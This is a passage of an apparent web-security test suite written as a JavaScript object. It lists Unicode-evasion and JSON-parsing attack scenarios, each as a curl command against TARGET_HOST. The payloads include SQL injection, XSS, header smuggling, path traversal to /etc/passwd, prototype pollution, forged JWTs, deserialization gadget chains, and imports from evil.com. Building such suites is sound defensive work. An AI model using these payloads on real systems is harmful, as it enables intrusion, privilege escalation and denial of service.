                            description: 'SQL injection using Unicode character substitution',
                            curl: 'curl "http://TARGET_HOST/search?q=%EF%BC%87%20%EF%BC%8F%EF%BC%8A%20%EF%BC%A6%EF%BC%B2%EF%BC%AF%EF%BC%AD%20%EF%BC%B5%EF%BC%B3%EF%BC%A5%EF%BC%B2%EF%BC%B3%20%EF%BC%8D%EF%BC%8D" -v'
                        }
                    ]
                },
                {
                    id: 'UTF8-013',
                    name: 'UTF8 Byte Order Mark (BOM) Attacks',
                    severity: 'high',
                    description: 'Tests manipulation of UTF-8 BOMs to confuse parsers',
                    scenarios: [
                        {
                            id: 'UTF8-013-A',
                            name: 'BOM in Request Parameters',
                            description: 'Inserts UTF-8 BOM in request parameters',
                            curl: 'curl "http://TARGET_HOST/test?param=%EF%BB%BFpayload" -v'
                        },
                        {
                            id: 'UTF8-013-B',
                            name: 'BOM in HTTP Headers',
                            description: 'Inserts UTF-8 BOM in HTTP headers',
                            curl: 'curl "http://TARGET_HOST/test" -H "X-Custom: %EF%BB%BFvalue" -v'
                        },
                        {
                            id: 'UTF8-013-C',
                            name: 'Multiple BOMs Injection',
                            description: 'Inserts multiple BOMs throughout request',
                            curl: 'curl "http://TARGET_HOST/test?p1=%EF%BB%BFval1&p2=%EF%BB%BFval2" -H "X-Test: %EF%BB%BFvalue" -v'
                        }
                    ]
                },
                {
                    id: 'UTF8-014',
                    name: 'Character Set Conversion Attacks',
                    severity: 'critical',
                    description: 'Tests attacks that exploit character set conversion inconsistencies',
                    scenarios: [
                        {
                            id: 'UTF8-014-A',
                            name: 'UTF-8 to ISO-8859-1 Conversion',
                            description: 'Exploits conversion between UTF-8 and ISO-8859-1',
                            curl: 'curl "http://TARGET_HOST/test" -H "Content-Type: text/plain; charset=ISO-8859-1" -d "%C3%A9vil" -v'
                        },
                        {
                            id: 'UTF8-014-B',
                            name: 'Charset Mismatch Attack',
                            description: 'Uses mismatched charset declarations',
                            curl: 'curl "http://TARGET_HOST/test" -H "Content-Type: text/plain; charset=utf-8" -H "X-Override-Charset: ISO-8859-1" -d "%C3%A9vil" -v'
                        },
                        {
                            id: 'UTF8-014-C',
                            name: 'Multi-stage Charset Conversion',
                            description: 'Exploits multi-stage charset conversion vulnerabilities',
                            curl: 'curl "http://TARGET_HOST/test" -H "Content-Type: text/plain; charset=EUC-JP" -d "%8F%A2%8E%9A" -v'
                        }
                    ]
                },
                {
                    id: 'UTF8-015',
                    name: 'URL Component-Specific Unicode Attacks',
                    severity: 'high',
                    description: 'Tests Unicode attacks targeting specific URL components',
                    scenarios: [
                        {
                            id: 'UTF8-015-A',
                            name: 'Unicode in URL Path',
                            description: 'Manipulates path components with Unicode',
                            curl: 'curl "http://TARGET_HOST/%E2%80%AE%E2%80%AEfdp.php" -v'
                        },
                        {
                            id: 'UTF8-015-B',
                            name: 'Unicode in URL Fragment',
                            description: 'Injects payloads in URL fragments',
                            curl: 'curl "http://TARGET_HOST/test#%E2%80%AE%3Cimg%20src=x%20onerror=alert(1)%3E" -v'
                        },
                        {
                            id: 'UTF8-015-C',
                            name: 'Unicode in Query Parameter Names',
                            description: 'Uses Unicode in parameter names',
                            curl: 'curl "http://TARGET_HOST/test?%E2%80%AEeman=value" -v'
                        }
                    ]
                },
                {
                    id: 'UTF8-016',
                    name: 'HTTP Protocol Smuggling with Unicode',
                    severity: 'critical',
                    description: 'Tests HTTP protocol smuggling using Unicode characters',
                    scenarios: [
                        {
                            id: 'UTF8-016-A',
                            name: 'Unicode Line Breaks in Headers',
                            description: 'Uses Unicode line breaks to smuggle headers',
                            curl: 'curl "http://TARGET_HOST/test" -H "X-Custom: value%E2%80%A8X-Injected: malicious" -v'
                        },
                        {
                            id: 'UTF8-016-B',
                            name: 'Unicode Whitespace in Headers',
                            description: 'Uses exotic Unicode whitespace in headers',
                            curl: 'curl "http://TARGET_HOST/test" -H "X-Test:%E2%80%80malicious" -v'
                        },
                        {
                            id: 'UTF8-016-C',
                            name: 'Transfer-Encoding Manipulation',
                            description: 'Manipulates Transfer-Encoding with Unicode',
                            curl: 'curl "http://TARGET_HOST/test" -H "Transfer-Encod%C3%ADng: chunked" -v'
                        }
                    ]
                },
                {
                    id: 'UTF8-017',
                    name: 'Content-Type and Charset Manipulation',
                    severity: 'high',
                    description: 'Tests manipulation of Content-Type and charset declarations',
                    scenarios: [
                        {
                            id: 'UTF8-017-A',
                            name: 'Malformed Charset Declaration',
                            description: 'Uses malformed charset declarations',
                            curl: 'curl "http://TARGET_HOST/test" -H "Content-Type: text/html; charset=utf-8%C3%28" -v'
                        },
                        {
                            id: 'UTF8-017-B',
                            name: 'Multiple Charset Declarations',
                            description: 'Declares multiple conflicting charsets',
                            curl: 'curl "http://TARGET_HOST/test" -H "Content-Type: text/html; charset=utf-8; charset=iso-8859-1" -v'
                        },
                        {
                            id: 'UTF8-017-C',
                            name: 'Exotic Charset Declaration',
                            description: 'Declares rare or custom charset',
                            curl: 'curl "http://TARGET_HOST/test" -H "Content-Type: text/html; charset=x-user-defined" -v'
                        }
                    ]
                },
                {
                    id: 'UTF8-018',
                    name: 'Homograph Attack Vectors',
                    severity: 'high',
                    description: 'Tests homograph attacks using visually similar Unicode characters',
                    scenarios: [
                        {
                            id: 'UTF8-018-A',
                            name: 'Domain Spoofing',
                            description: 'Uses homographs to spoof domain names',
                            curl: 'curl "http://TARGET_HOST/redirect?url=https://еxаmрlе.com" -v'
                        },
                        {
                            id: 'UTF8-018-B',
                            name: 'Command Injection Homographs',
                            description: 'Uses homographs in command injection',
                            curl: 'curl "http://TARGET_HOST/run?cmd=рing%20127.0.0.1" -v'
                        },
                        {
                            id: 'UTF8-018-C',
                            name: 'Script Tag Homographs',
                            description: 'Uses homographs to bypass XSS filters',
                            curl: 'curl "http://TARGET_HOST/comment?text=<ѕсrірt>alert(1)</ѕсrірt>" -v'
                        }
                    ]
                },
                {
                    id: 'UTF8-019',
                    name: 'Browser-Specific Unicode Parsing',
                    severity: 'high',
                    description: 'Tests browser-specific Unicode parsing behaviors',
                    scenarios: [
                        {
                            id: 'UTF8-019-A',
                            name: 'Chrome Unicode Handling',
                            description: 'Tests Chrome-specific Unicode parsing',
                            curl: 'curl "http://TARGET_HOST/test?browser=chrome&payload=%E2%80%A8javascript:alert(1)" -v'
                        },
                        {
                            id: 'UTF8-019-B',
                            name: 'Safari Unicode Handling',
                            description: 'Tests Safari-specific Unicode parsing',
                            curl: 'curl "http://TARGET_HOST/test?browser=safari&payload=%E2%80%AE%E2%80%8Ealert(1)" -v'
                        },
                        {
                            id: 'UTF8-019-C',
                            name: 'Firefox Unicode Handling',
                            description: 'Tests Firefox-specific Unicode parsing',
                            curl: 'curl "http://TARGET_HOST/test?browser=firefox&payload=javascript%E3%80%82alert(1)" -v'
                        }
                    ]
                },
                {
                    id: 'UTF8-020',
                    name: 'Line Breaking and Whitespace Evasion',
                    severity: 'high',
                    description: 'Tests evasion using Unicode line breaks and whitespace',
                    scenarios: [
                        {
                            id: 'UTF8-020-A',
                            name: 'Zero-Width Spaces',
                            description: 'Uses zero-width spaces to evade detection',
                            curl: 'curl "http://TARGET_HOST/test?payload=java%E2%80%8Bscript:alert(1)" -v'
                        },
                        {
                            id: 'UTF8-020-B',
                            name: 'Line Separator Injection',
                            description: 'Uses Unicode line separators',
                            curl: 'curl "http://TARGET_HOST/test?payload=alert%E2%80%A8(1)" -v'
                        },
                        {
                            id: 'UTF8-020-C',
                            name: 'Paragraph Separator Injection',
                            description: 'Uses Unicode paragraph separators',
                            curl: 'curl "http://TARGET_HOST/test?payload=alert%E2%80%A9(1)" -v'
                        }
                    ]
                },
                {
                    id: 'UTF8-021',
                    name: 'Input Validation Bypass with Unicode',
                    severity: 'critical',
                    description: 'Tests bypassing input validation using Unicode',
                    scenarios: [
                        {
                            id: 'UTF8-021-A',
                            name: 'Email Validation Bypass',
                            description: 'Bypasses email validation with Unicode',
                            curl: 'curl "http://TARGET_HOST/register?email=user@%D0%B5xample.com" -v'
                        },
                        {
                            id: 'UTF8-021-B',
                            name: 'URL Validation Bypass',
                            description: 'Bypasses URL validation with Unicode',
                            curl: 'curl "http://TARGET_HOST/redirect?url=javascript%E3%80%82alert(1)" -v'
                        },
                        {
                            id: 'UTF8-021-C',
                            name: 'File Extension Bypass',
                            description: 'Bypasses file extension validation',
                            curl: 'curl "http://TARGET_HOST/upload" -F "file=@payload.js%E2%80%AE.jpg" -v'
                        }
                    ]
                },
                {
                    id: 'UTF8-022',
                    name: 'Header Folding with Unicode',
                    severity: 'high',
                    description: 'Tests header folding attacks using Unicode',
                    scenarios: [
                        {
                            id: 'UTF8-022-A',
                            name: 'Basic Header Folding',
                            description: 'Uses basic header folding with Unicode',
                            curl: 'curl "http://TARGET_HOST/test" -H "X-Header: legitimate%E2%80%A8X-Injected: malicious" -v'
                        },
                        {
                            id: 'UTF8-022-B',
                            name: 'Folding with Exotic Whitespace',
                            description: 'Uses exotic Unicode whitespace for folding',
                            curl: 'curl "http://TARGET_HOST/test" -H "X-Header: legitimate%E2%81%9FX-Injected: malicious" -v'
                        },
                        {
                            id: 'UTF8-022-C',
                            name: 'Multi-line Header Injection',
                            description: 'Injects multiple headers via folding',
                            curl: 'curl "http://TARGET_HOST/test" -H "X-Header: legitimate%E2%80%A8X-Header1: malicious1%E2%80%A8X-Header2: malicious2" -v'
                        }
                    ]
                },
                {
                    id: 'UTF8-023',
                    name: 'Unicode in HTTP Cookies',
                    severity: 'high',
                    description: 'Tests Unicode manipulation in HTTP cookies',
                    scenarios: [
                        {
                            id: 'UTF8-023-A',
                            name: 'Unicode in Cookie Names',
                            description: 'Uses Unicode in cookie names',
                            curl: 'curl "http://TARGET_HOST/test" -H "Cookie: %E2%80%AEeikoo%E2%80%AC=malicious" -v'
                        },
                        {
                            id: 'UTF8-023-B',
                            name: 'Unicode in Cookie Values',
                            description: 'Uses Unicode in cookie values',
                            curl: 'curl "http://TARGET_HOST/test" -H "Cookie: session=%E2%80%AEcisumalm%E2%80%AC" -v'
                        },
                        {
                            id: 'UTF8-023-C',
                            name: 'Cookie Attribute Injection',
                            description: 'Injects cookie attributes via Unicode',
                            curl: 'curl "http://TARGET_HOST/test" -H "Cookie: session=value%E2%80%A8;%20HttpOnly;%20SameSite=None" -v'
                        }
                    ]
                },
                {
                    id: 'UTF8-024',
                    name: 'Unicode in HTTP Methods',
                    severity: 'critical',
                    description: 'Tests using Unicode characters in HTTP methods',
                    scenarios: [
                        {
                            id: 'UTF8-024-A',
                            name: 'Unicode-Extended HTTP Method',
                            description: 'Uses Unicode characters in HTTP method',
                            curl: 'curl -X "G%C3%89T" "http://TARGET_HOST/test" -v'
                        },
                        {
                            id: 'UTF8-024-B',
                            name: 'Custom Unicode Method',
                            description: 'Uses a custom method with Unicode',
                            curl: 'curl -X "P%C3%81TCH" "http://TARGET_HOST/test" -v'
                        },
                        {
                            id: 'UTF8-024-C',
                            name: 'Method Smuggling',
                            description: 'Smuggles another method using Unicode',
                            curl: 'curl -X "GET%E2%80%A8POST" "http://TARGET_HOST/test" -v'
                        }
                    ]
                }
            ],
           'JSON Parsing': [
                {
                    id: 'JSON-001',
                    name: 'Disable JSON Parsing',
                    severity: 'high',
                    description: 'Tests if JSON parsing can be bypassed or disabled',
                    scenarios: [
                        {
                            id: 'JSON-001-A',
                            name: 'Invalid JSON with XSS',
                            description: 'XSS payload in malformed JSON',
                            curl: 'curl -X POST "http://TARGET_HOST/api" -H "Content-Type: application/json" -d \'{"test":"<script>alert(1)</ script>"}\' -v'
                        },
                        {
                            id: 'JSON-001-B',
                            name: 'JSON Parser DoS',
                            description: 'Deeply nested JSON for parser DoS',
                            curl: 'curl -X POST "http://TARGET_HOST/api" -H "Content-Type: application/json" -d \'{"a":{"b":{"c":{"d":{"e":{"f":{"g":{"h":{"i":{"j":{}}}}}}}}}}\' -v'
                        },
                        {
                            id: 'JSON-001-C',
                            name: 'JSON Comment Injection',
                            description: 'JavaScript comments in JSON',
                            curl: 'curl -X POST "http://TARGET_HOST/api" -H "Content-Type: application/json" -d \'{"test":"value"/*,"admin":true*/}\' -v'
                        }
                    ]
                },
                {
                    id: 'JSON-002',
                    name: 'Disable Parsing for JavaScript Content-Type',
                    severity: 'high',
                    description: 'Tests JSON parsing with JavaScript content type',
                    scenarios: [
                        {
                            id: 'JSON-002-A',
                            name: 'JavaScript Content Type',
                            description: 'Direct JavaScript execution attempt',
                            curl: 'curl -X POST "http://TARGET_HOST/api" -H "Content-Type: application/javascript" -d \'alert(document.cookie)\' -v'
                        },
                        {
                            id: 'JSON-002-B',
                            name: 'Text/JavaScript Type',
                            description: 'Alternative JavaScript content type',
                            curl: 'curl -X POST "http://TARGET_HOST/api" -H "Content-Type: text/javascript" -d \'window.location="http://evil.com"\' -v'
                        },
                        {
                            id: 'JSON-002-C',
                            name: 'Module JavaScript',
                            description: 'ES6 module content type',
                            curl: 'curl -X POST "http://TARGET_HOST/api" -H "Content-Type: application/javascript; charset=module" -d \'import evil from "http://evil.com/steal.js"\' -v'
                        }
                    ]
                },
                {
                    id: 'JSON-003',
                    name: 'Allow Curly Brackets after JSON Block',
                    severity: 'medium',
                    description: 'Tests JSON parsing with additional curly brackets',
                    scenarios: [
                        {
                            id: 'JSON-003-A',
                            name: 'Extra Closing Bracket',
                            description: 'Additional closing bracket after valid JSON',
                            curl: 'curl -X POST "http://TARGET_HOST/api" -H "Content-Type: application/json" -d \'{"key": "value"}}\' -v'
                        },
                        {
                            id: 'JSON-003-B',
                            name: 'Multiple Extra Brackets',
                            description: 'Multiple extra brackets',
                            curl: 'curl -X POST "http://TARGET_HOST/api" -H "Content-Type: application/json" -d \'{"test": "data"}}}}\' -v'
                        },
                        {
                            id: 'JSON-003-C',
                            name: 'Mixed Brackets',
                            description: 'Mixed bracket types after JSON',
                            curl: 'curl -X POST "http://TARGET_HOST/api" -H "Content-Type: application/json" -d \'{"data": "test"}}]\' -v'
                        }
                    ]
                },
                {
                    id: 'JSON-004',
                    name: 'Allow Multiple Parameters with Same Name in JSON',
                    severity: 'medium',
                    description: 'Tests JSON with duplicate parameter names',
                    scenarios: [
                        {
                            id: 'JSON-004-A',
                            name: 'Duplicate Keys',
                            description: 'Same key multiple times',
                            curl: 'curl -X POST "http://TARGET_HOST/api" -H "Content-Type: application/json" -d \'{"user":"guest","user":"admin"}\' -v'
                        },
                        {
                            id: 'JSON-004-B',
                            name: 'Nested Duplicates',
                            description: 'Duplicate keys in nested objects',
                            curl: 'curl -X POST "http://TARGET_HOST/api" -H "Content-Type: application/json" -d \'{"data":{"id":1,"id":999}}\' -v'
                        },
                        {
                            id: 'JSON-004-C',
                            name: 'Array with Duplicates',
                            description: 'Duplicate keys with array values',
                            curl: 'curl -X POST "http://TARGET_HOST/api" -H "Content-Type: application/json" -d \'{"role":["user"],"role":["admin"]}\' -v'
                        }
                    ]
                },
                {
                    id: 'JSON-005',
                    name: 'JSON Type Confusion Attacks',
                    severity: 'critical',
                    description: 'Tests JSON parser type confusion vulnerabilities',
                    scenarios: [
                        {
                            id: 'JSON-005-A',
                            name: 'String to Numeric Confusion',
                            description: 'Exploits string-to-number confusion',
                            curl: 'curl -X POST "http://TARGET_HOST/api" -H "Content-Type: application/json" -d \'{"id":"12345", "id": 12345}\' -v'
                        },
                        {
                            id: 'JSON-005-B',
                            name: 'Boolean Type Confusion',
                            description: 'Exploits string-to-boolean confusion',
                            curl: 'curl -X POST "http://TARGET_HOST/api" -H "Content-Type: application/json" -d \'{"admin":"false", "admin": false}\' -v'
                        },
                        {
                            id: 'JSON-005-C',
                            name: 'Array to Object Confusion',
                            description: 'Exploits array-to-object confusion',
                            curl: 'curl -X POST "http://TARGET_HOST/api" -H "Content-Type: application/json" -d \'{"permissions":["user"], "permissions": {"admin": true}}\' -v'
                        }
                    ]
                },
                {
                    id: 'JSON-006',
                    name: 'JSON Injection in Various Contexts',
                    severity: 'high',
                    description: 'Tests injection of JSON in different contexts',
                    scenarios: [
                        {
                            id: 'JSON-006-A',
                            name: 'JSON in URL Parameter',
                            description: 'Injects JSON via URL parameter',
                            curl: 'curl "http://TARGET_HOST/api?config={%22admin%22:true,%22role%22:%22superuser%22}" -v'
                        },
                        {
                            id: 'JSON-006-B',
                            name: 'JSON in Cookie',
                            description: 'Injects JSON via Cookie header',
                            curl: 'curl "http://TARGET_HOST/api" -H "Cookie: user_settings={%22admin%22:true}" -v'
                        },
                        {
                            id: 'JSON-006-C',
                            name: 'JSON in Custom Header',
                            description: 'Injects JSON via custom header',
                            curl: 'curl "http://TARGET_HOST/api" -H "X-Settings: {%22admin%22:true}" -v'
                        }
                    ]
                },
                {
                    id: 'JSON-007',
                    name: 'Parser Implementation Differences',
                    severity: 'high',
                    description: 'Tests differences between JSON parser implementations',
                    scenarios: [
                        {
                            id: 'JSON-007-A',
                            name: 'Trailing Commas',
                            description: 'Tests handling of trailing commas',
                            curl: 'curl -X POST "http://TARGET_HOST/api" -H "Content-Type: application/json" -d \'{"name":"test", "value":123, }\' -v'
                        },
                        {
                            id: 'JSON-007-B',
                            name: 'Non-String Keys',
                            description: 'Tests non-string keys in objects',
                            curl: 'curl -X POST "http://TARGET_HOST/api" -H "Content-Type: application/json" -d \'{123: "value", true: "boolean_key"}\' -v'
                        },
                        {
                            id: 'JSON-007-C',
                            name: 'JSON5 Syntax',
                            description: 'Tests JSON5 extended syntax',
                            curl: 'curl -X POST "http://TARGET_HOST/api" -H "Content-Type: application/json" -d \'{// Comment\n  unquoted: "value",\n  singleQuotes: \'allowed\'\n}\' -v'
                        }
                    ]
                },
                {
                    id: 'JSON-008',
                    name: 'JSON with Unicode Escapes',
                    severity: 'high',
                    description: 'Tests JSON parser handling of Unicode escape sequences',
                    scenarios: [
                        {
                            id: 'JSON-008-A',
                            name: 'Unicode in Keys',
                            description: 'Uses Unicode escapes in object keys',
                            curl: 'curl -X POST "http://TARGET_HOST/api" -H "Content-Type: application/json" -d \'{"\\u0061\\u0064\\u006d\\u0069\\u006e": true}\' -v'
                        },
                        {
                            id: 'JSON-008-B',
                            name: 'Surrogate Pair Escapes',
                            description: 'Uses surrogate pair Unicode escapes',
                            curl: 'curl -X POST "http://TARGET_HOST/api" -H "Content-Type: application/json" -d \'{"payload":"\\uD834\\uDD1E"}\' -v'
                        },
                        {
                            id: 'JSON-008-C',
                            name: 'Invalid Surrogate Pairs',
                            description: 'Tests handling of invalid surrogate pairs',
                            curl: 'curl -X POST "http://TARGET_HOST/api" -H "Content-Type: application/json" -d \'{"broken":"\\uD834"}\' -v'
                        }
                    ]
                },
                {
                    id: 'JSON-009',
                    name: 'JSON with Numeric Overflows',
                    severity: 'medium',
                    description: 'Tests handling of numeric overflows in JSON',
                    scenarios: [
                        {
                            id: 'JSON-009-A',
                            name: 'Integer Overflow',
                            description: 'Tests integer overflow handling',
                            curl: 'curl -X POST "http://TARGET_HOST/api" -H "Content-Type: application/json" -d \'{"id":9223372036854775808}\' -v'
                        },
                        {
                            id: 'JSON-009-B',
                            name: 'Negative Zero',
                            description: 'Tests negative zero handling',
                            curl: 'curl -X POST "http://TARGET_HOST/api" -H "Content-Type: application/json" -d \'{"value":-0}\' -v'
                        },
                        {
                            id: 'JSON-009-C',
                            name: 'Exponential Notation',
                            description: 'Tests exponential notation handling',
                            curl: 'curl -X POST "http://TARGET_HOST/api" -H "Content-Type: application/json" -d \'{"value":1e308}\' -v'
                        }
                    ]
                },
                {
                    id: 'JSON-010',
                    name: 'JSON Prototype Pollution',
                    severity: 'critical',
                    description: 'Tests JSON prototype pollution vulnerabilities',
                    scenarios: [
                        {
                            id: 'JSON-010-A',
                            name: 'Basic Prototype Pollution',
                            description: 'Basic prototype pollution payload',
                            curl: 'curl -X POST "http://TARGET_HOST/api" -H "Content-Type: application/json" -d \'{"__proto__":{"admin":true}}\' -v'
                        },
                        {
                            id: 'JSON-010-B',
                            name: 'Nested Prototype Pollution',
                            description: 'Nested prototype pollution',
                            curl: 'curl -X POST "http://TARGET_HOST/api" -H "Content-Type: application/json" -d \'{"user":{"__proto__":{"isAdmin":true}}}\' -v'
                        },
                        {
                            id: 'JSON-010-C',
                            name: 'Constructor Prototype Pollution',
                            description: 'Constructor-based prototype pollution',
                            curl: 'curl -X POST "http://TARGET_HOST/api" -H "Content-Type: application/json" -d \'{"constructor":{"prototype":{"admin":true}}}\' -v'
                        }
                    ]
                },
                {
                    id: 'JSON-011',
                    name: 'JSON with Malformed Arrays',
                    severity: 'medium',
                    description: 'Tests parsing of malformed JSON arrays',
                    scenarios: [
                        {
                            id: 'JSON-011-A',
                            name: 'Unterminated Array',
                            description: 'Array missing closing bracket',
                            curl: 'curl -X POST "http://TARGET_HOST/api" -H "Content-Type: application/json" -d \'{"data":[1,2,3}\' -v'
                        },
                        {
                            id: 'JSON-011-B',
                            name: 'Empty Array Elements',
                            description: 'Array with empty elements',
                            curl: 'curl -X POST "http://TARGET_HOST/api" -H "Content-Type: application/json" -d \'{"data":[1,,3]}\' -v'
                        },
                        {
                            id: 'JSON-011-C',
                            name: 'Array Depth Limit',
                            description: 'Tests array depth limit handling',
                            curl: 'curl -X POST "http://TARGET_HOST/api" -H "Content-Type: application/json" -d \'{"data":[[[[[[[[[[[[[[[[[[[[[[]]]]]]]]]]]]]]]]]]]]]]}\' -v'
                        }
                    ]
                },
                {
                    id: 'JSON-012',
                    name: 'JSON Schema Validation Bypass',
                    severity: 'high',
                    description: 'Tests bypassing JSON schema validation',
                    scenarios: [
                        {
                            id: 'JSON-012-A',
                            name: 'Type Coercion Bypass',
                            description: 'Bypasses validation via type coercion',
                            curl: 'curl -X POST "http://TARGET_HOST/api" -H "Content-Type: application/json" -d \'{"age":"21"}\' -v'
                        },
                        {
                            id: 'JSON-012-B',
                            name: 'Additional Properties',
                            description: 'Tests handling of unexpected properties',
                            curl: 'curl -X POST "http://TARGET_HOST/api" -H "Content-Type: application/json" -d \'{"username":"user","isAdmin":true}\' -v'
                        },
                        {
                            id: 'JSON-012-C',
                            name: 'Format Validation Bypass',
                            description: 'Bypasses format validation',
                            curl: 'curl -X POST "http://TARGET_HOST/api" -H "Content-Type: application/json" -d \'{"email":"user@example.com\\u0000malicious"}\' -v'
                        }
                    ]
                },
                {
                    id: 'JSON-013',
                    name: 'JSON with Path Traversal',
                    severity: 'critical',
                    description: 'Tests JSON-based path traversal attacks',
                    scenarios: [
                        {
                            id: 'JSON-013-A',
                            name: 'Basic Path Traversal',
                            description: 'Basic path traversal in JSON',
                            curl: 'curl -X POST "http://TARGET_HOST/api" -H "Content-Type: application/json" -d \'{"filename":"../../etc/passwd"}\' -v'
                        },
                        {
                            id: 'JSON-013-B',
                            name: 'Encoded Path Traversal',
                            description: 'Path traversal with encoded characters',
                            curl: 'curl -X POST "http://TARGET_HOST/api" -H "Content-Type: application/json" -d \'{"file":"..\\u002f..\\u002fetc\\u002fpasswd"}\' -v'
                        },
                        {
                            id: 'JSON-013-C',
                            name: 'Nested Path Traversal',
                            description: 'Path traversal in nested objects',
                            curl: 'curl -X POST "http://TARGET_HOST/api" -H "Content-Type: application/json" -d \'{"config":{"path":"../../../etc/passwd"}}\' -v'
                        }
                    ]
                },
                {
                    id: 'JSON-014',
                    name: 'Advanced JSON DoS Techniques',
                    severity: 'high',
                    description: 'Tests advanced JSON DoS attack vectors',
                    scenarios: [
                        {
                            id: 'JSON-014-A',
                            name: 'Hash Collision DoS',
                            description: 'Hash collision denial of service',
                            curl: 'curl -X POST "http://TARGET_HOST/api" -H "Content-Type: application/json" -d \'{"a":"x","a1":"x","a2":"x","a3":"x",...,"a1000":"x"}\' -v'
                        },
                        {
                            id: 'JSON-014-B',
                            name: 'Deep Recursion DoS',
                            description: 'Recursive JSON structure for DoS',
                            curl: 'curl -X POST "http://TARGET_HOST/api" -H "Content-Type: application/json" -d \'{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{}}}}}}}}}}}}}}\' -v'
                        },
                        {
                            id: 'JSON-014-C',
                            name: 'Large Number DoS',
                            description: 'Very large numbers for DoS',
                            curl: 'curl -X POST "http://TARGET_HOST/api" -H "Content-Type: application/json" -d \'{"number":1e1000}\' -v'
                        }
                    ]
                },
                {
                    id: 'JSON-015',
                    name: 'JSON Web Token (JWT) Attacks',
                    severity: 'critical',
                    description: 'Tests attacks against JSON Web Tokens',
                    scenarios: [
                        {
                            id: 'JSON-015-A',
                            name: 'JWT Algorithm None',
                            description: 'Removes signature with alg:none',
                            curl: 'curl "http://TARGET_HOST/api" -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9." -v'
                        },
                        {
                            id: 'JSON-015-B',
                            name: 'JWT Algorithm Confusion',
                            description: 'Algorithm confusion attack',
                            curl: 'curl "http://TARGET_HOST/api" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.cAOIAifu3fykvhkHpbuhbvtH807-Z2rI1FS3vX1XMjE" -v'
                        },
                        {
                            id: 'JSON-015-C',
                            name: 'JWT Signature Bypass',
                            description: 'Removes JWT signature completely',
                            curl: 'curl "http://TARGET_HOST/api" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9" -v'
                        }
                    ]
                },
                {
                    id: 'JSON-016',
                    name: 'JSON Serialization Attacks',
                    severity: 'high',
                    description: 'Tests vulnerabilities in JSON serialization',
                    scenarios: [
                        {
                            id: 'JSON-016-A',
                            name: 'Date Serialization',
                            description: 'Tests Date object serialization',
                            curl: 'curl -X POST "http://TARGET_HOST/api" -H "Content-Type: application/json" -d \'{"date": {"__proto__": {"constructor": {"name": "Date"}}}}\' -v'
                        },
                        {
                            id: 'JSON-016-B',
                            name: 'Function Serialization',
                            description: 'Attempts function serialization',
                            curl: 'curl -X POST "http://TARGET_HOST/api" -H "Content-Type: application/json" -d \'{"func": {"__proto__": {"constructor": {"name": "Function", "body": "return process.env"}}}}\' -v'
                        },
                        {
                            id: 'JSON-016-C',
                            name: 'RegExp Serialization',
                            description: 'Tests RegExp object serialization',
                            curl: 'curl -X POST "http://TARGET_HOST/api" -H "Content-Type: application/json" -d \'{"regex": {"__proto__": {"constructor": {"name": "RegExp", "source": ".*"}}}}\' -v'
                        }
                    ]
                },
                {
                    id: 'JSON-017',
                    name: 'JSON Deserialization Attacks',
                    severity: 'critical',
                    description: 'Tests vulnerabilities in JSON deserialization',
                    scenarios: [
                        {
                            id: 'JSON-017-A',
                            name: 'Constructor Injection',
                            description: 'Injects a malicious constructor',
                            curl: 'curl -X POST "http://TARGET_HOST/api" -H "Content-Type: application/json" -d \'{"$type":"System.IO.FileInfo, System.IO","fileName":"C:\\\\Windows\\\\win.ini"}\' -v'
                        },
                        {
                            id: 'JSON-017-B',
                            name: 'Class Serialization',
                            description: 'Attempts class instantiation',
                            curl: 'curl -X POST "http://TARGET_HOST/api" -H "Content-Type: application/json" -d \'{"$class":"java.lang.Runtime","$method":"getRuntime","$args":[]}\' -v'
                        },
                        {
                            id: 'JSON-017-C',
                            name: 'Gadget Chain',
                            description: 'Attempts gadget chain exploitation',
                            curl: 'curl -X POST "http://TARGET_HOST/api" -H "Content-Type: application/json" -d \'{"obj":{"$type":"System.Windows.Data.ObjectDataProvider","MethodName":"Start","ObjectInstance":{"$type":"System.Diagnostics.Process","StartInfo":"calc.exe"}}}\' -v'
                        }
                    ]
                },
                {
                    id: 'JSON-018',
                    name: 'JSON with CRLF Injection',
                    severity: 'high',
                    description: 'Tests CRLF injection in JSON data',
                    scenarios: [
                        {
                            id: 'JSON-018-A',
                            name: 'Basic CRLF Injection',
                            description: 'Simple CRLF injection in JSON',
                            curl: 'curl -X POST "http://TARGET_HOST/api" -H "Content-Type: application/json" -d \'{"data":"test\\r\\nSet-Cookie: malicious=1"}\' -v'
                        },
                        {
                            id: 'JSON-018-B',
                            name: 'CRLF with Header Injection',
                            description: 'CRLF to inject custom header',
                            curl: 'curl -X POST "http://TARGET_HOST/api" -H "Content-Type: application/json" -d \'{"user":"victim\\r\\nX-Custom-Header: injection"}\' -v'
                        },
                        {
                            id: 'JSON-018-C',
                            name: 'Encoded CRLF Injection',
                            description: 'Unicode-encoded CRLF injection',
                            curl: 'curl -X POST "http://TARGET_HOST/api" -H "Content-Type: application/json" -d \'{"payload":"test\\u000d\\u000aSet-Cookie: hacked=1"}\' -v'
                        }
                    ]
                },
                {
                    id: 'JSON-019',
                    name: 'JSON CSRF Attacks',
                    severity: 'high',
                    description: 'Tests JSON Cross-Site Request Forgery attacks',
                    scenarios: [
                        {
                            id: 'JSON-019-A',
                            name: 'Content-Type Override',
                            description: 'Overrides Content-Type for CSRF',
                            curl: 'curl -X POST "http://TARGET_HOST/api" -H "Content-Type: application/json" -H "X-Content-Type-Override: application/x-www-form-urlencoded" -d \'{"admin":true}\' -v'
                        },
                        {
                            id: 'JSON-019-B',
                            name: 'JSON Array Wrapper',
                            description: 'Wraps JSON in array for CSRF',
                            curl: 'curl -X POST "http://TARGET_HOST/api" -H "Content-Type: application/json" -d \'[{"user":"admin","role":"superuser"}]\' -v'
                        },
                        {
                            id: 'JSON-019-C',
                            name: 'Content-Type Charset Attack',
                            description: 'CSRF via charset manipulation',
